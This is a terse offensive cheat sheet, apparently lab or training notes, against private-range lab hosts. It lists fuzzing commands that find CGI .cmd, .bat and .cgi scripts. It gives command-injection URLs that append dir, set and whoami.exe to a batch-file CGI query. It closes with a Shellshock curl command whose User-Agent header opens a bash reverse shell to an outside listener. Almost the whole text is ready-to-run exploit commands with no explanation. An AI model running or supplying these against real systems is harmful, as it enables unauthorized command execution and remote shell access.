## Fuzzing Extentions - .CMD
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

## Fuzzing Extentions - .BAT
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

## CGI Exploitation
http://10.129.204.227:8080/cgi/welcome.bat?&dir

http://10.129.204.227:8080/cgi/welcome.bat?&set

http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

## Shellshock Enum
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

## Shellshock Exploitation
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
